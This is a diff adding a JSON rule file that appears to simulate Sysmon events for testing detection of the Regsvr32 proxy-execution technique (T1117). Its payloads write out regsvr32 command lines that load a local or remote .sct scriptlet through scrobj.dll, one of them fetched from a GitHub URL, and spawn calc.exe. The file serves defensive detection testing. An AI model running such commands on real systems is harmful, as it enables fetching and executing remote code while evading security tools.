@@ -1,0 +1,66 @@
+{
+    "name": "T1117 - Regsvr32",
+    "version": "0.1",
+    "author": "n0dec",
+    "description": "Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations.",
+    "rules": {
+        "regsvr32_execute": {
+            "enabled": true,
+            "source": "Sysmon",
+            "category": "Process Create",
+            "description": "Executing code with RegSvr32.",
+            "payload": {
+                "Image": "C:\\Windows\\System32\\regsvr32.exe",
+                "Description": "Microsoft(C) Register Server",
+                "CommandLine": "regsvr32.exe  /s /u /i:RegSvr32.sct scrobj.dll"
+            }
+        },
+        "regsvr32_child": {
+            "enabled": true,
+            "source": "Sysmon",
+            "category": "Process Create",
+            "description": "Executing code with RegSvr32.",
+            "payload": {
+                "ParentImage": "C:\\Windows\\System32\\regsvr32.exe",
+                "ParentCommandLine": "regsvr32.exe  /s /u /i:RegSvr32.sct scrobj.dll",
+                "Image": "C:\\Windows\\System32\\calc.exe",
+                "CommandLine": "\"C:\\Windows\\System32\\calc.exe\""
+            }
+        },
+        "regsvr32_execute_remote": {
+            "enabled": true,
+            "source": "Sysmon",
+            "category": "Process Create",
+            "description": "Executing code with RegSvr32.",
+            "payload": {
+                "Image": "C:\\Windows\\System32\\regsvr32.exe",
+                "Description": "Microsoft(C) Register Server",
+                "CommandLine": "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll"
+            }
+        },
+        "regsvr32_network": {
+            "enabled": true,
+            "source": "Sysmon",
+            "category": "Network connection detected",
+            "description": "Network activity from RegSvr32.",
+            "payload": {
+                "Image": "C:\\Windows\\System32\\regsvr32.exe",
+                "DestinationIp": "151.101.132.133",
+                "DestinationPort": 443,
+                "DestinationPortName": "https"
+            }
+        },
+        "regsvr32_remote_child": {
+            "enabled": true,
+            "source": "Sysmon",
+            "category": "Process Create",
+            "description": "Executing code with RegSvr32.",
+            "payload": {
+                "ParentImage": "C:\\Windows\\System32\\regsvr32.exe",
+                "ParentCommandLine": "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
+                "Image": "C:\\Windows\\System32\\calc.exe",
+                "CommandLine": "\"C:\\Windows\\System32\\calc.exe\""
+            }
+        }
+    }
+}
